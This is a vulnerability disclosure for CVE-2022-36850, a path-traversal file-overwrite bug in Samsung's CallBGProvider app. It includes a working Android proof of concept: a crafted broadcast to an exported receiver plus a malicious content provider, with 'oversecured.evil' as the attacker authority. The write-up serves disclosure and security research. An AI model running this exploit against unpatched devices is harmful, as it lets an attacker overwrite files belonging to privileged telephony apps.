# Details

<table>
    <tr>
        <td>Name</td>
        <td>CallBGProvider</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.callbgprovider</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.22</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.09.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36850">CVE-2022-36850</a> (SVE-2022-0702)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$530</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

During the research it turned out that the receiver `com.samsung.android.callbgprovider.bnr.CallBackgroungSmartSwitchReceiver` is exported and deals with exporting and importing backups. The main problem was that the `com.samsung.android.callbgprovider.bnr.utils.BnRDocumentStorageAccessHelper.moveUrisToDir()` method handled document URIs. The methods used from the Android Framework, such as `DocumentsContract.getDocumentId()`, are not path-traversal safe. Responses from these methods can be controlled by the attacker when they control the entire URI. However, the app used this data to form a file path where it wrote content from content providers that the attacker also controlled.

**Proof of Concept**

File `MainActivity.java`:
```java
String overwriteLocation = "/sdcard/1337";

Intent i = new Intent("com.samsung.android.intent.action.REQUEST_RESTORE_CALLBACKGROUND");
i.setClassName("com.samsung.android.callbgprovider", "com.samsung.android.callbgprovider.bnr.CallBackgroungSmartSwitchReceiver");
i.putExtra("SAVE_PATH", "not_empty");
i.putExtra("SOURCE", "not_empty");
i.putExtra("SESSION_KEY", "not_empty");
i.putExtra("SAVE_PATH_URIS", new ArrayList<>(Arrays.asList("content://oversecured.evil/document/xyzxyz",
        "content://oversecured.evil/document/" + Uri.encode(overwriteLocation))));
sendBroadcast(i);
```

File `AndroidManifest.xml`:
```xml
<provider android:name=".MyContentProvider" android:authorities="oversecured.evil" android:exported="true">
    <intent-filter>
        <action android:name="android.content.action.DOCUMENTS_PROVIDER" />
    </intent-filter>
</provider>
```

File `MyContentProvider.java`:
```java
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    try {
        return getContext().getAssets().openFd("evil.txt").getParcelFileDescriptor();
    } catch (IOException e) {
        throw new FileNotFoundException(e.getMessage());
    }
}
```

Because the app had the `android:sharedUserId="android.uid.phone"` setting, overwriting arbitrary files also affected the following apps:
- `com.android.mms.service`
- `com.android.ons`
- `com.android.phone`
- `com.android.providers.telephony`
- `com.android.stk`
- `com.android.stk2`
- `com.samsung.android.app.telephonyui`
- `com.samsung.android.cidmanager`
- `com.samsung.android.incallui`
- `com.samsung.sec.android.application.csc`
- `com.sec.phone`
